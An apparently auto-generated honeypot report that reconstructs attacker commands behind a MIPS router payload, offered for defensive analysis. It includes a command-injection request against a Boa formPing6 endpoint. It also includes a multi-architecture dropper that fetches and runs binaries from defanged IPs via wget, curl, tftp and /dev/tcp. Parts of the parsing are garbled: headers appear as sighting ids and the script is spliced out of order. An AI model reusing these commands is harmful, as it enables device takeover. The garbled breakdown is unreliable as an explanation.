# Human-readable Command Trace

This file reconstructs the attacker-observed command sequence that led to the payload capture. Commands are defanged and shown for defensive analysis only.

## Artifact

- Artifact ID: `82064`
- SHA256: `cad9e90cb8998664e5b39e7336c2310016f5b29704296a1070d950fa40ea8e41`
- Source URL: `hxxp://154[.]90[.]70[.]23/mips`
- Analysis state: `needs_review`

## Observed sightings

### Sighting 1

- id: `29`
- created_at: `2026-08-14 21:06:57[.]099845`
- attacker_src_ip: `172[.]20[.]20[.]10`
- download_url: `hxxp://154[.]90[.]70[.]23/mips`

#### Raw command, defanged

```text
POST /boaform/adminformLogout//boaform/admin/formPing6 HTTP/1[.]1
```

#### Step-by-step

1. `POST /boaform/adminformLogout//boaform/admin/formPing6 HTTP/1[.]1`  
   Meaning: observed command fragment.

### Sighting 2

- id: `Host: 190[.]179[.]183[.]147`

No `command_raw` value present for this sighting.

### Sighting 3

- id: `Content-Length: 167`

No `command_raw` value present for this sighting.

### Sighting 4

- id: `User-Agent: Mozilla/5[.]0`

No `command_raw` value present for this sighting.

### Sighting 5

- id: `Connection: close`

No `command_raw` value present for this sighting.

### Sighting 6


No `command_raw` value present for this sighting.

### Sighting 7

- id: `pingAddr=`cd /tmp; wget hxxp://154[.]90[.]70[.]23/mips; chmod 777 mips;[.]/mips post`&wanif=65535&go= Ping&submit-url=/ping6[.]asp&postSecurityFlag=34430`

No `command_raw` value present for this sighting.

### Sighting 8

- id: `11`
- created_at: `2026-08-14 20:43:38[.]944711`
- attacker_src_ip: `102[.]208[.]240[.]251`
- download_url: `hxxp://45[.]87[.]174[.]8/k[.]php?a=mips,99N97OK5FN9K9D75H`

#### Raw command, defanged

```text
wget -nc hxxp://45[.]87[.]174[.]8/k[.]php?a=mips,99N97OK5FN9K9D75H -O [.]/upnpsetup
```

#### Step-by-step

1. `wget -nc hxxp://45[.]87[.]174[.]8/k[.]php?a=mips,99N97OK5FN9K9D75H -O [.]/upnpsetup`  
   Meaning: download payload or remote script.

### Sighting 9

- id: `6`
- created_at: `2026-08-14 20:43:22[.]129369`
- attacker_src_ip: `176[.]65[.]148[.]93`
- download_url: `hxxp://$HOST/real_$REAL_ARCH`

#### Raw command, defanged

```text
cd /tmp 2>/dev/null || cd /var/tmp 2>/dev/null || cd /dev/shm 2>#!/bin/sh; HOST="91[.]199[.]133[.]133:8080"; BIN=/tmp/[.]n; /dev/null; ARCH=""; CPUINFO=$(cat /proc/cpuinfo 2>/dev/null | head -20); case "$CPUINFO" in;     *mips*el*|*MIPS*el*|*mips*le*) ARCH="mipsel" ;;;     *mips*|*MIPS*) ARCH="mips" ;;;     *arm*|*ARM*);         if echo "$CPUINFO" | grep -q "v7"; then ARCH="armv7l";         elif echo "$CPUINFO" | grep -q "aarch64\|armv8\|arm64"; then ARCH="arm";         else ARCH="arm"; fi ;;;     *x86_64*|*amd64*|*AMD64*) ARCH="x86_64" ;;;     *i486*|*i586*|*i686*|*Intel*) ARCH="x86_64" ;;;     *powerpc*|*ppc*|*PowerPC*) ARCH="powerpc" ;;;     *);         UNAME=$(uname -m 2>/dev/null);         case "$UNAME" in;             mips) ARCH="mips" ;;;             mipsel) ARCH="mipsel" ;;;             arm*) ARCH="arm" ;;;             aarch64) ARCH="arm" ;;;             x86_64) ARCH="x86_64" ;;;             i*86) ARCH="x86_64" ;;;             *) ARCH="mips" ;; # default fallback;         esac;         ;;; esac; case "$ARCH" in;     armv7l|armv5l|armv4l|arm) REAL_ARCH="arm" ;;;     mips) REAL_ARCH="mips" ;;;     mipsel) REAL_ARCH="mipsel" ;;;     x86_64|i486) REAL_ARCH="x86_64" ;;;     powerpc) REAL_ARCH="arm" ;; # fallback to arm;     *) REAL_ARCH="mips" ;;; (wget hxxp://$HOST/real_$REAL_ARCH -O $BIN 2>/dev/null && chmod (curl -s hxxp://$HOST/real_$REAL_ARCH -o $BIN 2>/dev/null && chm(busybox wget hxxp://$HOST/real_$REAL_ARCH -O $BIN 2>/dev/null &(tftp -g -r real_$REAL_ARCH $HOST -l $BIN 2>/dev/null && chmod 7esac; 777 $BIN && $BIN) ||; od 777 $BIN && $BIN) ||; & chmod 777 $BIN && $BIN) ||; 77 $BIN && $BIN) ||; (exec 3<>/dev/tcp/91[.]199[.]133[.]133/8080 2>/dev/null && echo -e "GET /real_$REAL_ARCH HTTP/1[.]0\r\nHost: 91[.]199[.]133[.]133\r\n\r\n" >&3 && (read -r h; while read -r l && [ -n "$l" ]; do :; done; cat) <&3 > $BIN && chmod 777 $BIN && $BIN)
```

#### Step-by-step

1. `cd /tmp 2>/dev/null`  
   Meaning: change working directory.
2. `cd /var/tmp 2>/dev/null`  
   Meaning: change working directory.
3. `cd /dev/shm 2>#!/bin/sh`  
   Meaning: attempt execution.
4. `HOST="91[.]199[.]133[.]133:8080"`  
   Meaning: observed command fragment.
5. `BIN=/tmp/[.]n`  
   Meaning: observed command fragment.
6. `/dev/null`  
   Meaning: observed command fragment.
7. `ARCH=""`  
   Meaning: observed command fragment.
8. `CPUINFO=$(cat /proc/cpuinfo 2>/dev/null | head -20)`  
   Meaning: observed command fragment.
9. `case "$CPUINFO" in`  
   Meaning: observed command fragment.
10. `*mips*el*|*MIPS*el*|*mips*le*) ARCH="mipsel"`  
   Meaning: observed command fragment.
11. `*mips*|*MIPS*) ARCH="mips"`  
   Meaning: observed command fragment.
12. `*arm*|*ARM*)`  
   Meaning: observed command fragment.
13. `if echo "$CPUINFO" | grep -q "v7"`  
   Meaning: observed command fragment.
14. `then ARCH="armv7l"`  
   Meaning: observed command fragment.
15. `elif echo "$CPUINFO" | grep -q "aarch64\|armv8\|arm64"`  
   Meaning: observed command fragment.
16. `then ARCH="arm"`  
   Meaning: observed command fragment.
17. `else ARCH="arm"`  
   Meaning: observed command fragment.
18. `fi`  
   Meaning: observed command fragment.
19. `*x86_64*|*amd64*|*AMD64*) ARCH="x86_64"`  
   Meaning: observed command fragment.
20. `*i486*|*i586*|*i686*|*Intel*) ARCH="x86_64"`  
   Meaning: observed command fragment.
21. `*powerpc*|*ppc*|*PowerPC*) ARCH="powerpc"`  
   Meaning: observed command fragment.
22. `*)`  
   Meaning: observed command fragment.
23. `UNAME=$(uname -m 2>/dev/null)`  
   Meaning: observed command fragment.
24. `case "$UNAME" in`  
   Meaning: observed command fragment.
25. `mips) ARCH="mips"`  
   Meaning: observed command fragment.
26. `mipsel) ARCH="mipsel"`  
   Meaning: observed command fragment.
27. `arm*) ARCH="arm"`  
   Meaning: observed command fragment.
28. `aarch64) ARCH="arm"`  
   Meaning: observed command fragment.
29. `x86_64) ARCH="x86_64"`  
   Meaning: observed command fragment.
30. `i*86) ARCH="x86_64"`  
   Meaning: observed command fragment.
31. `*) ARCH="mips"`  
   Meaning: observed command fragment.
32. `# default fallback`  
   Meaning: observed command fragment.
33. `esac`  
   Meaning: observed command fragment.
34. `esac`  
   Meaning: observed command fragment.
35. `case "$ARCH" in`  
   Meaning: observed command fragment.
36. `armv7l|armv5l|armv4l|arm) REAL_ARCH="arm"`  
   Meaning: observed command fragment.
37. `mips) REAL_ARCH="mips"`  
   Meaning: observed command fragment.
38. `mipsel) REAL_ARCH="mipsel"`  
   Meaning: observed command fragment.
39. `x86_64|i486) REAL_ARCH="x86_64"`  
   Meaning: observed command fragment.
40. `powerpc) REAL_ARCH="arm"`  
   Meaning: observed command fragment.
41. `# fallback to arm`  
   Meaning: observed command fragment.
42. `*) REAL_ARCH="mips"`  
   Meaning: observed command fragment.
43. `(wget hxxp://$HOST/real_$REAL_ARCH -O $BIN 2>/dev/null`  
   Meaning: download payload or remote script.
44. `chmod (curl -s hxxp://$HOST/real_$REAL_ARCH -o $BIN 2>/dev/null`  
   Meaning: download payload or remote script.
45. `chm(busybox wget hxxp://$HOST/real_$REAL_ARCH -O $BIN 2>/dev/null &(tftp -g -r real_$REAL_ARCH $HOST -l $BIN 2>/dev/null`  
   Meaning: download payload or remote script.
46. `chmod 7esac`  
   Meaning: change permissions to make file executable.
47. `777 $BIN`  
   Meaning: observed command fragment.
48. `$BIN)`  
   Meaning: observed command fragment.
49. `od 777 $BIN`  
   Meaning: observed command fragment.
50. `$BIN)`  
   Meaning: observed command fragment.
51. `& chmod 777 $BIN`  
   Meaning: change permissions to make file executable.
52. `$BIN)`  
   Meaning: observed command fragment.
53. `77 $BIN`  
   Meaning: observed command fragment.
54. `$BIN)`  
   Meaning: observed command fragment.
55. `(exec 3<>/dev/tcp/91[.]199[.]133[.]133/8080 2>/dev/null`  
   Meaning: observed command fragment.
56. `echo -e "GET /real_$REAL_ARCH HTTP/1[.]0\r\nHost: 91[.]199[.]133[.]133\r\n\r\n" >&3`  
   Meaning: observed command fragment.
57. `(read -r h`  
   Meaning: observed command fragment.
58. `while read -r l`  
   Meaning: observed command fragment.
59. `[ -n "$l" ]`  
   Meaning: observed command fragment.
60. `do :`  
   Meaning: observed command fragment.
61. `done`  
   Meaning: observed command fragment.
62. `cat) <&3 > $BIN`  
   Meaning: observed command fragment.
63. `chmod 777 $BIN`  
   Meaning: change permissions to make file executable.
64. `$BIN)`  
   Meaning: observed command fragment.

## Safety note

This is not an execution recipe. It is a defensive reconstruction of attacker-observed commands. URLs are defanged and raw malware is not published here.
